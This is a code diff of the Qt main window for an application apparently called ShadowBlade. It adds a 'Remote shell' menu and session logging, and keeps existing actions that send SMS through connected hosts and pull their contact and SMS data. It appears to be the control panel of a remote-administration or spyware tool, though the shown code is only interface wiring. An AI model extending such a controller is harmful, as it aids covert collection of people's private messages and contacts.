@@ -10,6 +10,7 @@
 #include <QMessageBox>
 #include <QInputDialog>
 #include <QCloseEvent>
+#include <QMouseEvent>
 #include "dialog/sendsmsdialog.h"
 
 MainWindow::MainWindow(SessionManager& sessionManager, QWidget *parent) :
@@ -40,19 +41,12 @@ void MainWindow::closeEvent(QCloseEvent * event)
     }
 }
 
-void MainWindow::initView()
+void MainWindow::initRightMenu(QWidget* widget)
 {
-    qRegisterMetaType<HostInfo>("HostInfo");
-    QObject::connect(&mNetworkManager, SIGNAL(onIncomeHost(HostInfo)), &mModel, SLOT(putItem(HostInfo)));
-    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
-    ui->tableView->setModel(&mModel);
-    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
-    ui->tableView->resizeColumnToContents(0);
-
     QAction *aAll,*aNone,*aReverse;
-    ui->tableView->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
-    ui->tableView->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
-    ui->tableView->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));
+    widget->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
+    widget->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
+    widget->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));
 
     QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
     QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
@@ -60,20 +54,45 @@ void MainWindow::initView()
 
     QAction *separator = new QAction(QString(),ui->tableView);
     separator->setSeparator(true);
-    ui->tableView->addAction(separator);
+    widget->addAction(separator);
 
 
     QAction *aSendSms,*aLoadContact,*aLoadSms;
-    ui->tableView->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
-    ui->tableView->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
-    ui->tableView->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));
+    widget->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
+    widget->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
+    widget->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));
 
     QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
     QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
     QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
+}
+
+void MainWindow::initLeftMenu(QWidget* widget)
+{
+    QAction *aRemoteShell;
+    widget->addAction(aRemoteShell = new QAction(QString("Remote shell"),ui->tableView) );
+
+}
+
+void MainWindow::initView()
+{
+    qRegisterMetaType<HostInfo>("HostInfo");
+    QObject::connect(&mNetworkManager, SIGNAL(onIncomeHost(HostInfo)), &mModel, SLOT(putItem(HostInfo)));
+    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionSuccess(QString,HostInfo)), this, SLOT(onStartSessionSuccess(QString,HostInfo)));
+    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionFailed(QString,HostInfo)), this, SLOT(onStartSessionFailed(QString,HostInfo)));
+    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
+    ui->tableView->setModel(&mModel);
+    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
+    ui->tableView->resizeColumnToContents(0);
+    ui->tableView->horizontalHeader()->resizeSection(1, 200);
+
+    initLeftMenu(&mLeftMenu);
+    initRightMenu(ui->tableView);
 
     ui->actionStartServer->setText("Start Server");
     QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));
+
+    outputLogWarning("====================   ShadowBlade Running  ====================");
 }
 
 void MainWindow::updateView()
@@ -88,6 +107,7 @@ void MainWindow::handleServerStart()
         mNetworkManager.stop();
         mModel.cleanAll();
         ui->actionStartServer->setText("Start Server");
+        outputLogNormal("Server Stop");
     }
     else
     {
@@ -97,8 +117,8 @@ void MainWindow::handleServerStart()
         {
             ui->actionStartServer->setText(QString("Stop Server (Listen on %1)").arg(port));
             mNetworkManager.start(port);
+            outputLogNormal(QString("Server Start on port: %1").arg(port) );
         }
-
     }
 }
 
@@ -159,4 +179,35 @@ void MainWindow::loadContact()
     {
         mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_CONTACT);
     }
+}
+
+void MainWindow::on_tableView_doubleClicked(const QModelIndex &index)
+{
+    mCurrentIndex = index.row();
+    mLeftMenu.popup(cursor().pos());
+}
+
+void MainWindow::outputLogNormal(const QString& text)
+{
+    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + text );
+}
+
+void MainWindow::outputLogWarning(const QString& text)
+{
+    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#F00>" + text + "</font>");
+}
+
+void MainWindow::outputLogSuccess(const QString& text)
+{
+    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#0A0>" + text + "</font>");
+}
+
+
+void MainWindow::onStartSessionSuccess(QString sessionName, HostInfo hostInfo)
+{
+    outputLogSuccess( QString("[SUCCESS] %1 on %2:%3").arg(sessionName).arg(hostInfo.addr.toString()).arg(hostInfo.port)  );
+}
+void MainWindow::onStartSessionFailed(QString sessionName, HostInfo hostInfo)
+{
+    outputLogWarning( QString("[FAILED] %1 on %2:%3").arg(sessionName).arg(hostInfo.addr.toString()).arg(hostInfo.port)  );
 }
